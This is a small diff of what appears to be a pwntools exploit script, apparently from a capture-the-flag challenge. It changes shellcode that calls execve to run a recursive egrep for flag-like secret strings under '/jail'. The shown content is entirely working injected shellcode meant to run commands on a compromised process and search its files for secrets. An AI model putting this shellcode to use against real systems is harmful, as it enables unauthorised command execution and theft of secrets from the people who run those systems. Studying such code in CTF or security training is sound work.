@@ -33,7 +33,7 @@ jit_enable = "00000000000000000000"
 
 shellcode = shellcraft.pushstr( "/bin/egrep" )
 shellcode += "mov rdi, rsp;"
-shellcode += shellcraft.pushstr_array( "rsi", ["/bin/egrep", "-r", '[A-Z0-9]{31}=', './jail'])
+shellcode += shellcraft.pushstr_array( "rsi", ["/bin/egrep", "-r", '[A-Z0-9]{31}=', '/jail'])
 shellcode += "mov rdx, 0;"
 shellcode += "mov rax, 59;"
 shellcode += "syscall;"
